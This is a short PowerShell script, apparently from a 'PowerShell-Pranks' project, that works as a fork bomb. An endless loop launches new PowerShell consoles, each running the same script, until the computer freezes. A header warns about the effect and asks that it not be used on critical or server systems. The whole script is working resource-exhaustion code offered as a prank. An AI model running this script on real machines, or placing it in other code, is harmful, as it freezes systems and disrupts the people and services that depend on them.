#==========================================================#
#                    ¡¡ CAUTION !!                         #
# This script can freeze the computer, but keep calm,      #
# if you restart or kill all the child process its all OK  #
#                                                          #
#     Dont use it on critic/server enviroment, please.     #
#==========================================================#
<#
.SYNOPSIS
  Fork Bomb (Another version)
.DESCRIPTION
  Try to freez the PC creating, on infinite loop, a powershell console who runs this same script.

  This Script is Part of Powershell-Pranks project.
.NOTES
  Version:        1.0
  Author:         Hackstur (G.R.G.)
  Creation Date:  19/08/2018
.LINK
  https://github.com/Hackstur/PowerShell-Pranks
.EXAMPLE
  Just run the script.
#>

While (1) { $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); }
